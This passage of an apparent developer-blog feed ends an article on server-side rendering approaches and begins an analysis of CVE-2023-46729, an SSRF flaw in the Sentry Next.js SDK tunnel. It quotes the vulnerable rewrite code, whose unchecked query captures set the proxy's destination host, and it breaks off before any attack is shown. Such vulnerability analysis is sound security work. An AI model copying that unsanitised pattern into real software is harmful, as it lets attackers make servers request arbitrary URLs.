punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/favicon.ico<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width,initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>theme-color<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#000000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Web site created using create-react-app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/logo192.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>manifest<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/manifest.json<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>I am new title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">defer</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>defer<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/static/js/main.21981749.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/static/css/main.f855e6bc.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noscript</span><span class="token punctuation">></span></span>You need to enable JavaScript to run this app.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noscript</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-logo<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>When asked if her husband had any hobbies, Mary Todd Lincoln is said to have replied "cats."<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Cats make about 100 different sounds. Dogs make only about 10.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Owning a cat can reduce the risk of stroke and heart attack by a third.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Most cats are lactose intolerant, and milk can cause painful stomach cramps and diarrhea. It's best to forego the milk and just give your cat the standard: clean, cool drinking water.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>It was illegal to slay cats in ancient Egypt, in large part because they provided the great service of controlling the rat population.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://reactjs.org<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noopener noreferrer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Learn React Can you see me now?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The title has changed, and the content is the result of executing <code>useEffect()</code> and rendering after the <code>fetch</code> operation. Clicking the button can also trigger events, so there don’t seem to be any issues.</p><p>If we take a closer look, the rendering process of the prerendered page is similar to a normal React app. The only difference is that the original HTML already contains content, but React still executes once and re-renders the entire page.</p><p>Therefore, the following situation occurs:</p><ol><li>The server response is a complete page with data.</li><li>React starts and performs the initial rendering, at which point the data becomes the initial state, and the page becomes a state without data.</li><li>React mounts the result to the DOM, triggers <code>useEffect</code>, and makes another API call to fetch data.</li><li>The state is updated, and a page with data is rendered.</li></ol><p>This approach still targets search engines only. The difference from the first approach is that the page seen by users and search engines will be more similar, but still not exactly the same. After all, regular users will see a page with no content.</p><p>Can we show the prerendered page to regular users?</p><p>Yes, it is possible, but it may be a bit strange if there is an API involved. As mentioned earlier, the initial state has no data, but the HTML does. Therefore, the page seen by users will be: Has data (due to prerendered HTML) &#x3D;&gt; No data (state initialization) &#x3D;&gt; Has data (API call on the client). This may not provide a good user experience, so it is usually not done.</p><p>The advantage of this approach is that it is convenient. It does not require modifying the original SPA; only a middleware needs to be added on the server-side. However, the implementation is more complex compared to the first approach, and there are many details to consider.</p><h3><span id="third-type-server-rendering-client-app">Third Type: Server Rendering Client App</span></h3><p>This is the type that has been mentioned before: “generating the initial HTML on the server and handing over subsequent operations to the client.” Compared to the previous two types, this is the more ideal SSR and is commonly known as Isomorphic&#x2F;Universal.</p><p>This approach not only solves the SEO problem but also addresses the user experience. When a user visits the website, they can immediately see the rendered result. However, at this point, the page may not be interactive because the JavaScript has not finished executing. It is necessary to wait for the JavaScript to complete execution and attach event handlers before the page can be truly interactive.</p><p>Additionally, since the initial page has already been rendered on the server, there is usually no need to modify the DOM again on the client side. Only attaching the event handlers is required, and this process is called hydration.</p><p>I find this term quite visually descriptive. Imagine that the page output by SSR is “dehydrated,” very flat and dry, with only the visual elements. It cannot be interacted with. When it reaches the client, it needs to inject water into this dry page, add event handlers, and bring the whole page to life, making it interactive.</p><p>However, the drawback of this solution is that it is more complex to implement. One needs to consider API-related issues. For example, if an API call is placed inside a <code>useEffect</code>, it cannot be executed during server rendering, resulting in a page without any data.</p><p>Therefore, it may be necessary to add a function to fetch data for each page, store it in props, and correctly output a page with data during server-side rendering.</p><p>Due to its complexity, this task is usually delegated to frameworks like Next.js, which adopts the approach I mentioned earlier (Pages Router) and adds a <code>getServerSideProps</code> function to the page.</p><p>By the way, the first version of Next.js was released on October 25, 2016.</p><h3><span id="fourth-type-render-at-build-time">Fourth Type: Render at Build Time</span></h3><p>This is a specialized form of SSR tailored for specific product scenarios. The third type mentioned earlier involves rendering for each request, generating the initial page. However, if your page is the same for every user (e.g., the company introduction on an official website), there is no need to do this at runtime; it can be done at build time.</p><p>Therefore, one approach is to render the page during the build process, resulting in much faster speed.</p><p>This method is referred to as Static Site Generation (SSG) in Next.js.</p><h2><span id="how-to-name-the-different-types-of-ssr">How to Name the Different Types of SSR?</span></h2><p>Let’s summarize the four types mentioned earlier:</p><ol><li>Rendering a different template for search engines and bots</li><li>Pre-rendering for search engines</li><li>Server rendering client app</li><li>Render at build time</li></ol><p>Different documents use different names for these types. Let’s take a look at a few examples.</p><h3><span id="webdev">web.dev</span></h3><p>The first document is from web.dev: <a href="https://web.dev/articles/rendering-on-the-web">Rendering on the Web</a>. At the end of the article, there is a spectrum:</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p6.png" alt="SSR Spectrum"></p><p>The first type is not specifically mentioned, the second type is more like “CSR with Prerendering,” but not exactly, the third type is “SSR with (Re)hydration,” and the fourth type is “Static SSR.”</p><p>According to this article, the definition of SSR is:</p><blockquote><p>Server-side rendering (SSR): rendering a client-side or universal app to HTML on the server.</p></blockquote><p>So, the first type, which does not render the client-side app on the server, should not be considered as SSR.</p><h3><span id="nextjs">Next.js</span></h3><p>The second document is from the official Next.js documentation: <a href="https://nextjs.org/docs/pages/building-your-application/rendering">Building Your Application - Rendering</a>.</p><p>Here, the third type is referred to as SSR, and the fourth type is called SSG. The definition here is slightly different again. It refers to the process of “generating SPA HTML on the server” as pre-rendering:</p><blockquote><p>By default, Next.js pre-renders every page. This means that Next.js generates HTML for each page in advance, instead of having it all done by client-side JavaScript. Pre-rendering can result in better performance and SEO.</p></blockquote><p>And SSR specifically refers to “generating HTML for each request” to differentiate it from SSG.</p><h3><span id="nuxtjs">Nuxt.js</span></h3><p>Let’s start with Nuxt.js: <a href="https://nuxt.com/docs/guide/concepts/rendering">link</a></p><p>In the documentation, the third type is referred to as “Universal Rendering,” which I think is a good term:</p><blockquote><p>To not lose the benefits of the client-side rendering method, such as dynamic interfaces and page transitions, the Client (browser) loads the JavaScript code that runs on the Server in the background once the HTML document has been downloaded. The browser interprets it again (hence Universal rendering) and Vue.js takes control of the document and enables interactivity.</p></blockquote><p>As for the definition of SSR, it doesn’t seem to be explicitly stated, but based on the following sentence:</p><blockquote><p>This step is similar to traditional server-side rendering performed by PHP or Ruby applications.</p></blockquote><p>It should be anything that involves “rendering on the server” can be called SSR.</p><h3><span id="angular">Angular</span></h3><p>Now let’s look at Angular: <a href="https://angular.io/guide/ssr">link</a></p><p>Their definition of SSR is:</p><blockquote><p>Server-side rendering (SSR) is a process that involves rendering pages on the server, resulting in initial HTML content which contains initial page state.</p></blockquote><p>This definition seems similar to the previous one, as long as it involves “rendering pages on the server,” it can be called SSR.</p><h2><span id="summary-of-ssr">Summary of SSR</span></h2><p>Now that I’ve written up to this point, I have some thoughts on SSR.</p><p>To be honest, I think I may have initially made the problem more complicated. SSR simply refers to “rendering on the server,” so as long as it meets this requirement, it can indeed be called SSR.</p><p>Originally, I only intended to write about the different SSR solutions mentioned earlier, but before I started writing, I became curious about the definition of SSR, which led to the introductory paragraphs exploring its history.</p><p>What’s more important is whether we can answer the questions of what problems SSR aims to solve, how to solve them, and the pros and cons of each solution. Not every webpage requires Next.js to achieve SSR; we should choose the appropriate technology based on the context.</p><p>Next, let’s talk about the present and the future.</p><h2><span id="maximizing-performance-and-building-faster-webpages">Maximizing Performance and Building Faster Webpages</span></h2><p>The third solution we mentioned earlier seems perfect, right? It allows us to render the page on the server, solving the performance issues related to SEO and first paint, while also enabling client-side hydration for a SPA-like experience.</p><p>However, there are still areas for continuous improvement.</p><p>We briefly mentioned a small issue with hydration earlier, where until hydration is complete, although the page is visible, it is not interactive. For example, typing in an input may not have any response because the event handler hasn’t been attached yet or the component hasn’t finished rendering.</p><p>So, what can we do about this? Another term comes into play: <a href="https://www.patterns.dev/react/progressive-hydration">Progressive Hydration</a>. Instead of hydrating the entire page at once, we can do it block by block, prioritizing the more important ones. This way, users can interact immediately after the important blocks are hydrated, and then the less important blocks can be hydrated.</p><p>Furthermore, you may notice that certain sections of a webpage don’t need hydration at all because they are static, such as a footer that remains the same throughout. In such cases, we can use another technique called <a href="https://www.patterns.dev/react/react-selective-hydration">Selective Hydration</a> to pre-render the non-hydratable sections.</p><p>In 2019, Katie Sylor-Miller, the frontend architect at Etsy, proposed the <a href="https://jasonformat.com/islands-architecture/">Islands Architecture</a>, which views a webpage as composed of different islands:</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p7.png" alt="Islands Architecture"></p><p>The above image illustrates the concept of selective hydration that was just discussed. When we adopt this architecture and combine it with selective hydration and other techniques, we can render faster and achieve better performance.</p><p>For example, <a href="https://docs.astro.build/en/concepts/islands/">Astro</a> uses this architecture, where the entire page is static and only the interactive parts are separated into individual islands:</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">MyReactComponent</span></span> <span class="token attr-name"><span class="token namespace">client:</span>load</span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>React is also moving in this direction with server components, which is quite similar. By dividing the page into server and client components and determining which ones require state and which ones don’t, we can directly render the unnecessary components on the server and send them to the client, while maintaining the previous approach for the required components.</p><p>This approach does indeed accelerate web pages, but at the same time, development becomes more complex. There are more things to consider, and debugging becomes less convenient. I will share some insights and details in a future article.</p><h2><span id="conclusion">Conclusion</span></h2><p>I personally started exploring various frontend tools relatively late. Excluding the early days of using FrontPage or Dreamweaver, I began writing jQuery around 2012. Then, I observed the development of various frontend technologies but didn’t actually work with them. I had considered learning AngularJS (which was popular at the time) and Ember.js, but I was lazy.</p><p>It wasn’t until 2015 that I started working with React when it was just starting to gain popularity in Taiwan.</p><p>So, I didn’t participate in the era of Backbone.js and similar technologies. While writing this article, I researched a lot of information, which was quite interesting. It helped me fill in the gap of that period in history that I missed.</p><p>During my research, I also discovered that Yahoo! was truly a pioneer in frontend web development. For example, <a href="https://blog.huli.tw/2022/05/23/en/atomic-css-and-tailwind-css/">Atomic CSS</a> originated from Yahoo!, and I also found out that Yahoo! was already using a Universal JavaScript web framework back in 2012.</p><p>If you have a different perspective on SSR or feel that I have misunderstood the historical context, feel free to write a new article to discuss it with me. After all, some concepts cannot be explained in a few words, and writing an article provides a more comprehensive explanation. Alternatively, we can also discuss it through comments.</p><h2><span id="references">References</span></h2><ol><li><a href="https://en.wikipedia.org/wiki/Ajax_(programming)">AJAX</a></li><li><a href="https://www.sencha.com/blog/a-fond-farewell-to-yui/">A Fond Farewell to YUI</a></li><li><a href="https://en.wikipedia.org/wiki/XMLHttpRequest">XMLHttpRequest</a></li><li><a href="https://en.wikipedia.org/wiki/Isomorphic_JavaScript">Isomorphic JavaScript</a></li><li><a href="https://deno.com/blog/the-future-and-past-is-server-side-rendering">The Future (and the Past) of the Web is Server Side Rendering</a></li><li><a href="https://www.youtube.com/watch?v=k-A2VfuUROg&ab_channel=ChromeforDevelopers">Rendering on the Web: Performance Implications of Application Architecture (Google I&#x2F;O ’19)</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Did you know that when you discuss SSR with your friends, it’s highly likely that your understanding of SSR differs? Let’s take a few scenarios. Which ones do you consider as SSR?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Generating the view from the backend using PHP.&lt;/li&gt;
&lt;li&gt;Frontend is a React-based SPA, but if the backend detects a search engine, it switches to a different template that is specifically designed for search engines instead of the React-rendered page.&lt;/li&gt;
&lt;li&gt;Frontend is a React-based SPA, but it uses Prerender to render the page as HTML and then serves it to the search engine (regular users still get the SPA experience). The difference from the previous scenario is that the view seen by users and search engines is mostly the same.&lt;/li&gt;
&lt;li&gt;Frontend is a React-based SPA, and the backend uses &lt;code&gt;renderToString&lt;/code&gt; to render React into a string, but there is no data. The data is fetched on the frontend.&lt;/li&gt;
&lt;li&gt;Frontend is a React-based SPA, and the backend makes API calls to fetch data for each page. After fetching the data, it calls &lt;code&gt;renderToString&lt;/code&gt; to output HTML. On the client-side, hydration is performed to make the page interactive.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Some people believe that any view generated by the backend is considered SSR, so all scenarios 1 to 5 are SSR. Others think that the frontend must be an SPA for it to be called SSR, so scenarios 2 to 5 are SSR. Yet, some people consider hydration as the key aspect of SSR, so only scenario 5 (or 45) is SSR.&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Analysis of CVE-2023-46729: URL Rewrite Vulnerability in Sentry Next.js SDK</title>
    <link href="https://blog.huli.tw/2023/11/13/en/sentry-nextjs-sdk-cve-2023-46729/"/>
    <id>https://blog.huli.tw/2023/11/13/en/sentry-nextjs-sdk-cve-2023-46729/</id>
    <published>2023-11-13T06:40:00.000Z</published>
    <updated>2023-11-13T13:22:53.411Z</updated>
    
    <content type="html"><![CDATA[<p>On November 9, 2023, Sentry published an article on their blog titled <a href="https://blog.sentry.io/next-js-sdk-security-advisory-cve-2023-46729/">Next.js SDK Security Advisory - CVE-2023-46729</a>. The article discusses the details of the CVE-2023-46729 vulnerability, including its cause, discovery time, and patching time.</p><p>Although the vulnerability was officially announced on 11&#x2F;9, it was actually fixed in version 7.77.0 released on 10&#x2F;31. Some time was given to developers to patch the vulnerability.</p><p>Now let’s briefly discuss the cause and attack method of this vulnerability.</p><span id="more"></span><h2><span id="vulnerability-analysis">Vulnerability Analysis</span></h2><p>There is also a more technical explanation on GitHub: <a href="https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-2rmr-xw8m-22q9">CVE-2023-46729: SSRF via Next.js SDK tunnel endpoint</a></p><p>You can see this paragraph:</p><blockquote><p>An unsanitized input of Next.js SDK tunnel endpoint allows sending HTTP requests to arbitrary URLs and reflecting the response back to the user.</p></blockquote><p>In Sentry, there is a feature called “tunnel,” and this image from the <a href="https://docs.sentry.io/platforms/javascript/troubleshooting/#dealing-with-ad-blockers">official documentation</a> perfectly explains why tunneling is needed:</p><p><img src="/img/sentry-nextjs-sdk-cve-2023-46729/p1.png" alt="tunnel"></p><p>Without tunneling, requests sent to Sentry would be directly sent through the browser on the frontend. However, these requests sent directly to Sentry may be blocked by ad blockers, preventing Sentry from receiving the data. If tunneling is enabled, the request is first sent to the user’s own server and then forwarded to Sentry. This way, the request becomes a same-origin request and will not be blocked by ad blockers.</p><p>In the Sentry SDK specifically designed for Next.js, a feature called <a href="https://nextjs.org/docs/app/api-reference/next-config-js/rewrites">rewrite</a> is used. Here is an example from the official documentation:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">async</span> <span class="token function">rewrites</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>        <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token string">'/blog'</span><span class="token punctuation">,</span>        <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://example.com/blog'</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#123;</span>        <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token string">'/blog/:slug'</span><span class="token punctuation">,</span>        <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://example.com/blog/:slug'</span><span class="token punctuation">,</span> <span class="token comment">// Matched parameters can be used in the destination</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Next.js rewrite can be divided into two types: internal and external. The latter is more like a proxy, as it can directly redirect the request to an external website and display the response.</p><p>The implementation of the Next.js Sentry SDK is in <a href="https://github.com/getsentry/sentry-javascript/blob/7.69.0/packages/nextjs/src/config/withSentryConfig.ts#L98">sentry-javascript&#x2F;packages&#x2F;nextjs&#x2F;src&#x2F;config&#x2F;withSentryConfig.ts</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * Injects rewrite rules into the Next.js config provided by the user to tunnel * requests from the `tunnelPath` to Sentry. * * See https://nextjs.org/docs/api-reference/next.config.js/rewrites. */</span><span class="token keyword">function</span> <span class="token function">setUpTunnelRewriteRules</span><span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">userNextConfig</span><span class="token operator">:</span> NextConfigObject<span class="token punctuation">,</span> <span class="token literal-property property">tunnelPath</span><span class="token operator">:</span> string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> originalRewrites <span class="token operator">=</span> userNextConfig<span class="token punctuation">.</span>rewrites<span class="token punctuation">;</span>  <span class="token comment">// This function doesn't take any arguments at the time of writing but we future-proof</span>  <span class="token comment">// here in case Next.js ever decides to pass some</span>  userNextConfig<span class="token punctuation">.</span><span class="token function-variable function">rewrites</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args<span class="token operator">:</span> unknown<span class="token punctuation">[</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> injectedRewrite <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]`</span>      <span class="token comment">// Nextjs will automatically convert `source` into a regex for us</span>      <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tunnelPath<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(/?)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>      <span class="token literal-property property">has</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>          <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token comment">// short for orgId - we keep it short so matching is harder for ad-blockers</span>          <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;orgid>.*)'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>          <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>          <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token comment">// short for projectId - we keep it short so matching is harder for ad-blockers</span>          <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;projectid>.*)'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> originalRewrites <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">[</span>injectedRewrite<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @ts-expect-error Expected 0 arguments but got 1 - this is from the future-proofing mentioned above, so we don't care about it</span>    <span class="token keyword">const</span> originalRewritesResult <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">originalRewrites</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>originalRewritesResult<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">[</span>injectedRewrite<span class="token punctuation">,</span> <span class="token operator">...</span>originalRewritesResult<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token operator">...</span>originalRewritesResult<span class="token punctuation">,</span>        <span class="token literal-property property">beforeFiles</span><span class="token operator">:</span> <span class="token punctuation">[</span>injectedRewrite<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">(</span>originalRewritesResult<span class="token punctuation">.</span>beforeFiles <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 